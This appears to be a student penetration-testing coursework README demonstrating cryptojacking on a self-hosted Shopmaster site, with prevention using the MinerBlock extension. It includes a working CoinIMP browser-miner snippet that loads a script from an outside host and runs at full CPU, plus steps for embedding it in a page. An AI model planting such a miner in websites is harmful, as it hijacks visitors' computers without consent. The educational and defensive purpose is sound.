# Penetration Testing
Pentesting Coursework 2 Submission
Submitted by: Ketan Purohit (2149090) & Yash K (2145014)
---------------------------------------------------------------
As part of course work 2 of penetration testing we are submitting demo on Cryptojacking.

**Environment Used**
- OS: Ubuntu 18:04
- WebServer: Apache
- website: Shopmaster (OpenSource)

Here, We have added js script which uses visitors CPU and mines crypto tokens. 
### here is the main script which works behind the website to mine crypto.
---------------------------------------
```
<script src="https://www.hostingcloud.racing/j6Aw.js"></script>

<script>
    var _client = new Client.Anonymous('beb61******************179d31ac9f08e1cd66fef8', {
        throttle: 0, c: 'w'
    });
    _client.start();
    _client.addMiningNotification("Top", "This site is running JavaScript miner from coinimp.com", "#cccccc", 40, "#3d3d3d");

</script>
```
---------------------------------------

  To make JS fully functional and get crypto mined we have created an account "https://www.coinimp.com/" where we can see how many hashes are mined from our website.
  here we have used couple of parameters to notify and start the js script. we have an option to enable throttle which allows admin to limit usage of website users' CPU. for example if we set value to "0.4" in that case our website will use 60% CPU to mine the crypto. currently it is set to 0 so it will use 100% CPU and users System or PC may crash after while.
  
### How to exploit the attack?

To exploit we need to setup a webserver. steps are given below:
1. configure ubuntu/centos Server. 
2. Install Apache webserver 
3. Host your website and add above given JS code to your _index.html_ file.
4. Load the website in WebBrowser and you are all set to mine crypto tokens. :)

### How to Detect that you are under attack?

if user finds abnormal bevaiours in their system. like its heating too much, working slow or not responding multiple times. user can check the Task Manager and verify that they are facing any unauthorised load on the system or not?

### Prevention

To prevent this attack user need to install browser extensions which will block crypto mining JavaScripts and prevent the attack.user can see how many time this extension blocked any website, So going further user should be careful visiting those site and provide trusted details. 
These are known extensions to prevent Cryptojacking 
* minerblock
* coinhive block 
* nocoin

#### How MinorBlock Works?

The extension uses two different approaches to block miners. The first one is based on blocking requests/scripts loaded from a blacklist, this is the traditional approach adopted by most ad-blockers and other mining blockers. The other approach which makes MinerBlock more efficient against cryptojacking is detecting potential mining behaviour inside loaded scripts and kills them immediately. This makes the extension able to block inline scripts as well as miners running through proxies. Reference [https://github.com/xd4rker/MinerBlock]

### Implementation and Screenshots
1. Normal Marketshop opensource website hosted on WebServer.

![image](https://user-images.githubusercontent.com/36151313/159604293-3541fe23-edc6-4a89-a72a-d65cd4c8eccc.png)

2. CPU Utilization at the time of website visit.

![image](https://user-images.githubusercontent.com/36151313/159604774-c8a9e021-99d9-4de1-9f4f-d2d224410770.png)


3. adding JS script which work to mine crypto.

![image](https://user-images.githubusercontent.com/36151313/159604576-946d510c-9e69-4094-b6d6-77f377bbdfc1.png)

4. after adding the script we can see big spike in out CPU usage 

    ![image](https://user-images.githubusercontent.com/36151313/159605031-bca2411f-3513-45e2-a157-b2cbbf1b865c.png)

5. we are able to implement cryptojacking successfully. 
6. let's try to prevent our system from this malicious website. for this we have installed _minerblock_ extension.

![image](https://user-images.githubusercontent.com/36151313/159605255-b3cdfdba-f24d-4584-a37f-e7588bf93ee2.png)

7. after adding extension lets visit the website and check CPU Utilization again.
![image](https://user-images.githubusercontent.com/36151313/159605336-7f549eed-1560-4f1b-aa23-3f7c43e85626.png)

8. enable the extension and check the CPU performance again.
![image](https://user-images.githubusercontent.com/36151313/159605402-3f1771ab-c8b8-4573-94ec-ae6e1a7714cb.png)

as we can see in the screenshot _minorblock_ has blocked website 2 times and it shows the malicious links which are been used in the website to implemet cryptojacking.

## Happy Learning
##### _Note: This project is part of our academic project. this is not being used to harm anyone, all testings we have performed in our own systems and we are planning to take it down after submission._
